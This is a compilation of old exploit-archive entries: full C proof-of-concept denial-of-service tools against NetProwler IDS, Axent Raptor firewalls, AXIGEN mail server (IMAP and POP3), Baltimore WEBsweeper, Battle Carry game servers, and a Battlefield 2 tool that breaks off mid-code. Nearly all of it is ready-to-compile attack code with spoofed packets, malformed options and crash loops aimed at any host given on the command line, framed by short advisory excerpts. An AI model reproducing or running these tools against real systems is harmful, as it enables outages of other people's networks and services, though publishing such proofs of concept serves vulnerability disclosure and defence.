According to Axent Security team, this is not a fragmented packet issue as reported in RFP2K05 By Rain Forest Puppy.

In addition, NetProwler utilizes Microsoft JET engine 3.5 for storing incoming alert information. More information regarding the Microsoft JET engine 3.5 vulnerability can be found at:

http://www.securityfocus.com/bid/286 

/* 	RFProwl.c - rain forest puppy / wiretrip / rfp@wiretrip.net
	
	Kills NetProwler IDS version 3.0
	
	You need libnet installed.  It's available from
	www.packetfactory.net.  Acks to route.

	Only tested on RH 6.x Linux.  To compile:
	gcc RFProwl.c -lnet -o RFProwl			

	Plus, make sure your architecture is defined below:   */

#define LIBNET_LIL_ENDIAN 1
#undef  LIBNET_BIG_ENDIAN 1

#include <libnet.h>

/* it's just much easier to code in the packet frags we want. :) */

char pack1[]="\x45\x00"
"\x00\x24\x08\xb9\x00\x03\x3e\x06\x96\xf8\x0a\x09\x65\x0d\x0a\x09"
"\x64\x01\x04\x02\x08\x0a\x00\x26\xcd\x35\x00\x00\x00\x00\x01\x02"
"\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

char pack2[]="\x45\x00"
"\x00\x2c\x08\xbf\x20\x00\x3e\x06\x76\xed\x0a\x09\x65\x0d\x0a\x09"
"\x64\x01\x04\x08\x00\x15\xa7\xe4\x00\x48\x00\x00\x00\x00\xa0\x02"
"\x7d\x78\x72\x9d\x00\x00\x02\x04\x05\xb4\x00\x00";

int main(int argc, char **argv) {
    int sock, c;
    u_long src_ip, dst_ip;

    printf("RFProwl - rain forest puppy / wiretrip\n");

    if(argc<3){
      printf("Usage: RFProwl <profiled IP/destination> <src IP(fake)>\n");
      exit(EXIT_FAILURE);}

    dst_ip=inet_addr(argv[1]);
    src_ip=inet_addr(argv[2]);

    memcpy(pack1+16,&dst_ip,4);
    memcpy(pack2+16,&dst_ip,4);
    memcpy(pack1+12,&src_ip,4);
    memcpy(pack1+12,&src_ip,4);

    sock = open_raw_sock(IPPROTO_RAW);
    if (sock == -1){
      perror("Socket problems: ");
      exit(EXIT_FAILURE);}
    
    c = write_ip(sock, pack1, 46);
    if (c < 46) printf("Write_ip #1 choked\n");

    c = write_ip(sock, pack2, 46);
    if (c < 46) printf("Write_ip #2 choked\n");
  
    printf("Packets sent\n");

    return (c == -1 ? EXIT_FAILURE : EXIT_SUCCESS);}
source: http://www.securityfocus.com/bid/736/info

It is possible to remotely lock Axent Raptor firewalls by sending them packets with malformed IP options fields. According to an advisory posted to bugtraq by the perdue CERIAS labs, setting the SECURITY and TIMESTAMP IP options length to 0 can cause an infinite loop to occur within the code that handles the options (resulting in the software freezing). A consequence of this is a remote denial of service. 

/* CUT HERE */

/*
 * 10.26.1999
 * Axent Raptor 6.0 'IP Options DOS' as documented in BugTraq 10.20.1999
 *
 * Proof of Concept by MSG.Net, Inc.
 *
 * Tested on Intel/*BSD systems, your mileage may vary. No warranty.
 * Free to distribute as long as these comments remain intact.
 *
 * Exercises the IP options bug reported in Raptor 6.0, this bug is fixed by
 * an Axent official patch available at:
 *
 *                ftp://ftp.raptor.com/patches/V6.0/6.02Patch/
 *
 *
 *                                      The MSG.Net Firewall Wrecking Crew
 *
 *                                          [kadokev, l^3, strange, vn]
 *
 *                                          Quid custodiet ipsos custodes?
 */

#define __FAVOR_BSD
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define SRC_IP                      htonl(0x0a000001) /* 10.00.00.01 */
#define TCP_SZ                      20
#define IP_SZ                       20
#define PAYLOAD_LEN                 32
#define OPTSIZE                      4
#define LEN (IP_SZ + TCP_SZ + PAYLOAD_LEN + OPTSIZE)


void main(int argc, char *argv[])
{
  int checksum(unsigned short *, int);
  int raw_socket(void);
  int write_raw(int, unsigned char *, int);
  unsigned long option = htonl(0x44000001);  /* Timestamp, NOP, END */
  unsigned char *p;
  int s, c;
  struct ip *ip;
  struct tcphdr *tcp;

  if (argc != 2) {
    printf("Quid custodiet ipsos custodes?\n");
    printf("Usage: %s <destination IP>\n", argv[0]);
    return;
  }

  p = malloc(1500);
  memset(p, 0x00, 1500);

  if ((s = raw_socket()) < 0)
     return perror("socket");

  ip = (struct ip *) p;
  ip->ip_v    = 0x4;
  ip->ip_hl   = 0x5 + (OPTSIZE / 4);
  ip->ip_tos  = 0x32;
  ip->ip_len  = htons(LEN);
  ip->ip_id   = htons(0xbeef);
  ip->ip_off  = 0x0;
  ip->ip_ttl  = 0xff;
  ip->ip_p    = IPPROTO_TCP;
  ip->ip_sum  = 0;
  ip->ip_src.s_addr = SRC_IP;
  ip->ip_dst.s_addr = inet_addr(argv[1]);


  /* Masquerade the packet as part of a legitimate answer */
  tcp = (struct tcphdr *) (p + IP_SZ + OPTSIZE);
  tcp->th_sport   = htons(80);
  tcp->th_dport   = 0xbeef;
  tcp->th_seq     = 0x12345678;
  tcp->th_ack     = 0x87654321;
  tcp->th_off     = 5;
  tcp->th_flags   = TH_ACK | TH_PUSH;
  tcp->th_win     = htons(8192);
  tcp->th_sum     = 0;

  /* Set the IP options */
  memcpy((void *) (p + IP_SZ), (void *) &option, OPTSIZE);


  c =  checksum((unsigned short *) &(ip->ip_src), 8)
     + checksum((unsigned short *) tcp, TCP_SZ + PAYLOAD_LEN)
     + ntohs(IPPROTO_TCP + TCP_SZ);
  while (c >> 16)   c = (c & 0xffff) + (c >> 16);
  tcp->th_sum = ~c;

  printf("Sending %s -> ", inet_ntoa(ip->ip_src));
  printf("%s\n", inet_ntoa(ip->ip_dst));

  if (write_raw(s, p, LEN) != LEN)
     perror("sendto");
}


int write_raw(int s, unsigned char *p, int len)
{
  struct ip *ip = (struct ip *) p;
  struct tcphdr *tcp;
  struct sockaddr_in sin;

  tcp = (struct tcphdr *) (ip + ip->ip_hl * 4);

  memset(&sin, 0x00, sizeof(sin));
  sin.sin_family      = AF_INET;
  sin.sin_addr.s_addr = ip->ip_dst.s_addr;
  sin.sin_port        = tcp->th_sport;

  return (sendto(s, p, len, 0, (struct sockaddr *) &sin,
                 sizeof(struct sockaddr_in)));
}


int raw_socket(void)
{
  int s, o = 1;

  if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    return -1;

  if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (void *) &o, sizeof(o)) < 0)
    return (-1);

  return (s);
}


int checksum(unsigned short *c, int len)
{
  int sum  = 0;
  int left = len;

  while (left > 1) {
    sum += *c++;
    left -= 2;
  }
  if (left)
    sum += *c & 0xff;

  return (sum);
}

/*###EOF####*/

/* CUT HERE */
/* doaxigen-v2.c
 *
 * axigen 1.2.6 - 2.0.0b1 DoS (x86-lnx)
 * by mu-b - Sun Oct 29 2006
 *
 * - Tested on: AXIGEN 1.2.6 (lnx)
 *              AXIGEN 2.0.0b1 (lnx)
 *
 * parsing error results in login without username & password!
 * which in turn causes a NULL pointer dereference..
 */

/* dGFicyBhcmUgZm9yIGZhZ2dvdHNcIQ== */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>
#include <sys/types.h>

#define BUF_SIZE    1024
#define BBUF_SIZE   BUF_SIZE/3*4+1

#define AUTH_CMD    "1 AUTHENTICATE PLAIN\r\n"
#define APPEND_CMD  "2 APPEND digit-labs\r\n"

#define DEF_PORT    143
#define PORT_IMAPD  DEF_PORT

#define RCNT_DELAY  3

static const char base64tab[] =
  "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int base64 (const u_char * ibuf, u_char * obuf, size_t n);
static int sock_send (int sock, u_char * src, int len);
static int sock_recv (int sock, u_char * dst, int len);
static void zhammer (u_char * host);

static int
base64 (const u_char * ibuf, u_char * obuf, size_t n)
{
  int a, b, c;
  int i, j;
  int d, e, f, g;

  a = b = c = 0;
  for (j = i = 0; i < n; i += 3)
    {
      a = (u_char) ibuf[i];
      b = i + 1 < n ? (u_char) ibuf[i + 1] : 0;
      c = i + 2 < n ? (u_char) ibuf[i + 2] : 0;

      d = base64tab[a >> 2];
      e = base64tab[((a & 3) << 4) | (b >> 4)];
      f = base64tab[((b & 15) << 2) | (c >> 6)];
      g = base64tab[c & 63];

      if (i + 1 >= n)
        f = '=';
      if (i + 2 >= n)
        g = '=';

      obuf[j++] = d, obuf[j++] = e;
      obuf[j++] = f, obuf[j++] = g;
    }

  obuf[j++] = '\0';

  return strlen (obuf);
}

static int
sock_send (int sock, u_char * src, int len)
{
  int sbytes;

  sbytes = send (sock, src, len, 0);

  return (sbytes);
}

static int
sock_recv (int sock, u_char * dst, int len)
{
  int rbytes;

  rbytes = recv (sock, dst, len, 0);
  if (rbytes >= 0)
    dst[rbytes] = '\0';

  return (rbytes);
}

static int
sockami (u_char * host, int port)
{
  struct sockaddr_in address;
  struct hostent *hp;
  int sock;

  fflush (stdout);
  if ((sock = socket (AF_INET, SOCK_STREAM, 0)) == -1)
    {
      perror ("socket()");
      exit (-1);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      perror ("gethostbyname()");
      exit (-1);
    }

  memset (&address, 0, sizeof (address));
  memcpy ((char *) &address.sin_addr, hp->h_addr, hp->h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons (port);

  if (connect (sock, (struct sockaddr *) &address, sizeof (address)) == -1)
    {
      perror ("connect()");
      exit (EXIT_FAILURE);
    }

  return (sock);
}

static void
zhammer (u_char * host)
{
  int sock;
  u_int i;
  u_char *md5 = "*\x00";  /* what was that? */
  u_char sbuf[BBUF_SIZE], *sptr;
  u_char rbuf[BUF_SIZE];

  fd_set r_fds;
  struct timeval tv;

  base64 (md5, sbuf, strlen (md5)+1);
  sptr = sbuf + strlen (sbuf);
  *sptr++ = '\r', *sptr++ = '\n', *sptr = '\0';

  for (i = 0; i < -1; i++)
    {
      int rbytes;

      printf ("+Connecting to %s:%d. ", host, PORT_IMAPD);
      sock = sockami (host, PORT_IMAPD);
      rbytes = sock_recv (sock, rbuf, sizeof (rbuf) - 1);
      if (rbytes < 0)
        return;

      sock_send (sock, AUTH_CMD, strlen (AUTH_CMD));
      rbytes = sock_recv (sock, rbuf, sizeof (rbuf) - 1);
      if (rbytes < 0)
        break;

      sock_send (sock, sbuf, strlen (sbuf));
      rbytes = sock_recv (sock, rbuf, sizeof (rbuf) - 1);
      if (rbytes < 0)
        break;

      if (!strcmp (rbuf, "1 OK Done AUTHENTICATE"))
        {
          printf ("+Bah not vulnerable\n");
          exit (EXIT_SUCCESS);
        }

      sock_send (sock, APPEND_CMD, strlen (APPEND_CMD));

      FD_ZERO (&r_fds);
      FD_SET (sock, &r_fds);
      tv.tv_sec = 2;            /* wait 2 seconds */
      tv.tv_usec = 0;

      rbytes = select (sock + 1, &r_fds, NULL, NULL, &tv);
      if (rbytes == -1)         /* oh dear */
        perror ("select()");
      else if (rbytes > 1)          /* read response */
        {
          printf ("+Bah not vulnerable %d\n", rbytes);
          exit (EXIT_SUCCESS);
        }

      /* timeout, server appears to have crashed!@$%! */

      printf ("Wh00t\n");
      fflush (stdout);
      sleep (RCNT_DELAY);
    }
}

int
main (int argc, char **argv)
{
  printf ("axigen 1.2.6 - 2.0.0b1 DoS POC\n"
          "by: <mu-b@digit-labs.org>, <mu-b@65535.com>\n\n");

  if (argc <= 1)
    {
      fprintf (stderr, "Usage: %s <host>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  zhammer (argv[1]);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2007-02-08]
/* doaxigen.c
 *
 * axigen 1.2.6 - 2.0.0b1 DoS (x86-lnx)
 * by mu-b - Sat Oct 22 2006
 *
 * - Tested on: AXIGEN 1.2.6 (lnx)
 *              AXIGEN 2.0.0b1 (lnx)
 *
 * 0x08088054: parsing error results in DoS (little-endian, confirmed)
 *                                      DoS + off-by-one heap smash (big-endian)
 *
 * Note: if you receive a SIGPIPE then you crashed the server
 *       but at too high a memory address... try again.
 */

/* dGFicyBhcmUgZm9yIGZhZ2dvdHNcIQ== */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>
#include <sys/types.h>

#define BUF_SIZE    1024
#define BBUF_SIZE   BUF_SIZE/3*4+1

#define AUTH_CMD    "AUTH CRAM-MD5\r\n"
#define QUIT_CMD    "QUIT\r\n"

#define DEF_PORT    110
#define PORT_POP3   DEF_PORT

#define RCNT_DELAY  3

static const char base64tab[] =
  "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int base64 (const u_char * ibuf, u_char * obuf, size_t n);
static int sock_send (int sock, u_char * src, int len);
static int sock_recv (int sock, u_char * dst, int len);
static void zhammer (u_char * host);

static int
base64 (const u_char * ibuf, u_char * obuf, size_t n)
{
  int a, b, c;
  int i, j;
  int d, e, f, g;

  a = b = c = 0;
  for (j = i = 0; i < n; i += 3)
    {
      a = (u_char) ibuf[i];
      b = i + 1 < n ? (u_char) ibuf[i + 1] : 0;
      c = i + 2 < n ? (u_char) ibuf[i + 2] : 0;

      d = base64tab[a >> 2];
      e = base64tab[((a & 3) << 4) | (b >> 4)];
      f = base64tab[((b & 15) << 2) | (c >> 6)];
      g = base64tab[c & 63];

      if (i + 1 >= n)
        f = '=';
      if (i + 2 >= n)
        g = '=';

      obuf[j++] = d, obuf[j++] = e;
      obuf[j++] = f, obuf[j++] = g;
    }

  obuf[j++] = '\0';

  return strlen (obuf);
}

static int
sock_send (int sock, u_char * src, int len)
{
  int sbytes;

  sbytes = send (sock, src, len, 0);

  return (sbytes);
}

static int
sock_recv (int sock, u_char * dst, int len)
{
  int rbytes;

  rbytes = recv (sock, dst, len, 0);
  if (rbytes >= 0)
    dst[rbytes] = '\0';

  return (rbytes);
}

static int
sockami (u_char * host, int port)
{
  struct sockaddr_in address;
  struct hostent *hp;
  int sock;

  fflush (stdout);
  if ((sock = socket (AF_INET, SOCK_STREAM, 0)) == -1)
    {
      perror ("socket()");
      exit (-1);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      perror ("gethostbyname()");
      exit (-1);
    }

  memset (&address, 0, sizeof (address));
  memcpy ((char *) &address.sin_addr, hp->h_addr, hp->h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons (port);

  if (connect (sock, (struct sockaddr *) &address, sizeof (address)) == -1)
    {
      perror ("connect()");
      exit (EXIT_FAILURE);
    }

  return (sock);
}

static void
zhammer (u_char * host)
{
  int sock, rbytes;
  u_int i;
  u_char *md5 = "\" d339490346794f964736669ae26e29df";  /* what was that? */
  u_char sbuf[BBUF_SIZE], *sptr;
  u_char rbuf[BUF_SIZE];

  fd_set r_fds;
  struct timeval tv;

  base64 (md5, sbuf, strlen (md5));
  sptr = sbuf + strlen (sbuf);
  *sptr++ = '\r', *sptr++ = '\n', *sptr = '\0';

  printf ("+Connecting to %s:%d.", host, PORT_POP3);
  sock = sockami (host, PORT_POP3);
  rbytes = sock_recv (sock, rbuf, sizeof (rbuf) - 1);
  if (rbytes < 0)
    return;

  for (i = 0; i < -1; i++)
    {
      int rbytes;

      sock_send (sock, AUTH_CMD, strlen (AUTH_CMD));
      rbytes = sock_recv (sock, rbuf, sizeof (rbuf) - 1);
      if (rbytes < 0)
        break;

      sock_send (sock, sbuf, strlen (sbuf));

      FD_ZERO (&r_fds);
      FD_SET (sock, &r_fds);
      tv.tv_sec = 4;            /* wait 4 seconds */
      tv.tv_usec = 0;

      rbytes = select (sock + 1, &r_fds, NULL, NULL, &tv);
      if (rbytes == -1)         /* oh dear */
        perror ("select()");
      else if (rbytes)          /* read response */
        rbytes = sock_recv (sock, rbuf, sizeof (rbuf) - 1);
      else                      /* timeout, server appears to have crashed!@$%! */
        break;

      /* hmmm, too many attempts, must re-connect... */
      if (strstr (rbuf, "(maximum number of protocol errors reached)"))
        {
          close (sock);
          sleep (RCNT_DELAY);

          printf ("\n+Reconnecting to %s:%d.", host, PORT_POP3);
          sock = sockami (host, PORT_POP3);
          rbytes = sock_recv (sock, rbuf, sizeof (rbuf) - 1);
        }

      if (rbytes < 0)
        break;

      if (!((i + 1) % 4))
        printf ("..%d", i + 1);

      fflush (stdout);
      usleep (1000);
    }

  printf ("\n");
}

int
main (int argc, char **argv)
{
  printf ("axigen 1.2.6 - 2.0.0b1 DoS POC\n"
          "by: <mu-b@digit-labs.org>, <mu-b@65535.com>\n\n");

  if (argc <= 1)
    {
      fprintf (stderr, "Usage: %s <host>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  zhammer (argv[1]);

  printf ("+Wh00t!\n");

  return (EXIT_SUCCESS);
}

// milw0rm.com [2007-02-08]
source: http://www.securityfocus.com/bid/2465/info

Baltimore Technology WEBsweeper is subject to a denial of service condition. Submitting an unusually long HTTP request through WEBsweeper will cause the consumption of all available memory on the server where WEBsweeper resides. 

/*

----[ honoriak from [HeliSec] 22.3.2001

   	[ Proof of concept Websweeper Infinite HTTP Request DoS  ]
   	[ Advisory Defcom Labs Advisory def-2001-10	         ]

	Thanks to doing and all helisec members: merphe, jet-li, kiss,
	lyw0d, bonjy.

*/


#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <time.h>
#include <sys/time.h>
#include <fcntl.h>

#define PORT 80
#define LEN 2000000
#define CON 200

int i, v, n, sel, envi;
int cons[CON];
char ah[LEN];
char ahh[LEN + 7];
char *host;
fd_set env;
struct sockaddr_in victim;

void usage(char *prog) {
	printf("[ Websweeper Infinite HTTP Request DoS by honoriak@mail.ru ");
	printf("from Helisec ]\n");
	printf("-- Advisory: Defcom Labs Advisory def-2001-10 --\n\n");
	printf("Usage: %s hostname number_of_gets\n", prog);
	exit(0);
	}

unsigned long resolver(char *h)  {

struct in_addr h2;
struct hostent *hvic;

if (!(hvic = gethostbyname(h))) return(0);
memcpy((char *)&h2.s_addr, hvic->h_addr, hvic->h_length);
return(h2.s_addr);
}

int main(int argc, char *argv[])
{

	if (argc < 2)
        {
        	usage(argv[0]);
        }

bzero(&victim, sizeof(victim));
victim.sin_family = AF_INET;
victim.sin_port = htons(PORT);

if ( (inet_pton(AF_INET, argv[1], &victim.sin_addr)) <= 0)
	{
	victim.sin_addr.s_addr = resolver(argv[1]);
	}

if (!victim.sin_addr.s_addr) {
	printf("Error resolving host\n");
	exit(-1);
	}

for (i=0; i<=(LEN-1); i++)  ah[i] = 'a';
ah[LEN-1] = '\0';
printf("Sending Infinite HTTP Request...\n");

sprintf(ahh, "GET /%s\n", ah);

for (sel=0; sel < CON; sel++)
{

if ((cons[sel] = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
	printf("Error opening socket\n");
        exit(-1);
        }

if ( (n=connect(cons[sel], (struct sockaddr *)&victim, sizeof(victim))) < 0) {
                  printf("Error connecting\n");
                  exit(-1);
         }

}

for (sel=0; sel < CON; sel++) {

FD_SET(cons[sel], &env);

envi=select(cons[sel] + 1, NULL, &env, NULL, NULL);

if ( FD_ISSET(cons[sel], &env) ) {
if ( (send(cons[sel], ahh, strlen(ahh), 0)) < 1) {
	printf("Error sending\n");
	exit(-1);
	}
}

}
exit(-1);
}

/* [HeliSec] <=> [Helios Security and Administration] */

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

// inserted winerr.h /str0ke

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER         "0.1"
#define BUFFSZ      (8192 + 10) // +10 is for the BOOM
#define PORT        7000
#define TIMEOUT     1
#define INFO        "Requesting ServerInfoObject"



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz);
int timeout(int sock);
u_int resolv(char *host);
void std_err(void);



struct  sockaddr_in peer;



int main(int argc, char *argv[]) {
    int     sd,
            len;
    u_short port = PORT;
    u_char  buff[BUFFSZ];

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    setbuf(stdout, NULL);

    fputs("\n"
        "Battle Carry <= .005 socket termination "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n"
            "Note: this tool blocks all the 3 available server ports\n"
            "Note: port can be one of the 3 server ports, the tool will automatically\n"
            "      recognize it\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(argv[1]);
//  peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    printf("- get server info from port %hu:\n", port + 10);
    peer.sin_port        = htons(port + 10);
    len = send_recv(sd, INFO, sizeof(INFO) - 1, buff, sizeof(buff));
    if(len < 0) {
        printf("- get server info from port %hu:\n", port - 1000);
        peer.sin_port        = htons(port - 1000);
        len = send_recv(sd, INFO, sizeof(INFO) - 1, buff, sizeof(buff));
        if(len < 0) {
            printf("- get server info from port %hu:\n", port);
            peer.sin_port        = htons(port);
            len = send_recv(sd, INFO, sizeof(INFO) - 1, buff, sizeof(buff));
            if(len < 0) {
                printf("\n"
                    "Alert: no query port found, I try to send the packet only to the port %hu\n",
                    port);
            }
        }
    }

    if(len > 0) {
        port = ntohs(*(u_short *)(buff + 15));
        printf(
            "  IP:      %.15s\n"
            "  Port:    %hu\n"
            "  Name:    %.26s\n"
            "  Map:     %.16s\n"
            "  Players: %hhu\n"
            "  Mode:    %.5s\n"
            "\n",
            buff,
            port,
            buff + 17,
            buff + 42,
            buff[58],
            buff + 59);
    }

    printf("- send BOOM packet to the port %hu\n", port);
    peer.sin_port        = htons(port);
    memset(buff, 0, sizeof(buff));
    len = send_recv(sd, buff, sizeof(buff), buff, sizeof(buff));

    printf("- send BOOM packet to the port %hu\n", port + 10);
    peer.sin_port        = htons(port + 10);
    if(len > 0) memset(buff, 0, sizeof(buff));
    len = send_recv(sd, buff, sizeof(buff), buff, sizeof(buff));

    printf("- send BOOM packet to the port %hu\n", port + 1010);
    peer.sin_port        = htons(port + 1010);
    if(len > 0) memset(buff, 0, sizeof(buff));
    len = send_recv(sd, buff, sizeof(buff), buff, sizeof(buff));

    fputs("- check server:\n", stdout);
    peer.sin_port        = htons(port + 10);
    len = send_recv(sd, INFO, sizeof(INFO) - 1, buff, sizeof(buff));
    if(len < 0) {
        fputs("\n  Server IS vulnerable!!!\n", stdout);
    } else {
        fputs("\n  Server doesn't seem vulnerable\n", stdout);
    }

    close(sd);
    return(0);
}



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz) {
    int     retry,
            len;

    for(retry = 2; retry; retry--) {
        sendto(sd, in, insz, 0, (struct sockaddr *)&peer, sizeof(peer));
        if(!timeout(sd)) break;
    }

    if(!retry) return(-1);

    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
//    if(len < 0);

    return(len);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_int resolv(char *host) {
    struct  hostent *hp;
    u_int   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2005-11-02]
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <ctype.h>
#include <time.h>
#include "rwbits.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
    #define waitms(x)   sleep(x)
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
    #define stricmp strcasecmp
    #define waitms(x)   sleep(x * 1000)
#endif



#define VER         "0.1"
#define PORT        16567
#define BUFFSZ      0xffff
#define PADDING(x)  (((x) + 7) & ~7)
#define GS2_QUERY   "\xfe\xfd\x00" "\x00\x00\x00\x00"                    "\xff\x00\x00" "\x00"
#define GS3_QUERY   "\xfe\xfd\x09" "\x00\x00\x00\x00"
#define GS3_QUERYX  "\xfe\xfd\x00" "\x00\x00\x00\x00" "\x00\x00\x00\x00" "\xff\x00\x00" "\x00"

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



u32 setver(u8 *gamever);
int write_bstr(u8 *data, u32 len, u8 *buff, u32 bitslen);
int read_bstr(u8 *data, u32 len, u8 *buff, u32 bitslen);
u32 bf2_info(u8 *buff, struct sockaddr_in *peer);
int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...);
void fgetz(u8 *data, int len);
int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    u32     ver     = 0;
    int     sd,
            i,
            b,
            bug,
            len,
            res,
            err,
            token,
            slot    = 0,
            par1    = 1,
            par2    = 0x1002;
    u16     port    = PORT;
    u8      pass[33],
            mod[33],
            *buff,
            *host,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Battlefield 2 (1.41 - 1.1.2965-797) / 2142 (1.50 - 1.10.48.0) endless loop "VER"\n"
        "  bug found by Francis Lavoie-Renaud\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s [options] <host[:port]>\n"
            "\n"
            "Options:\n"
            "-p PORT set the server port, you can specify it after the host too (IP:PORT)\n"
            "        the default port used is %hu of bf2, so use 17567 for bf2142\n"
            "-v VER  set the exact version used by the server\n"
            "        if version is not set the tool will automatically get info from the\n"
            "        query port 29900 of the server since this parameter is needed\n"
            "\n", argv[0], port);
        exit(1);
    }

    argc--;
    for(i = 1; i < argc; i++) {
        if(((argv[i][0] != '-') && (argv[i][0] != '/')) || (strlen(argv[i]) != 2)) {
            printf("\nError: wrong argument (%s)\n", argv[i]);
            exit(1);
        }
        switch(argv[i][1]) {
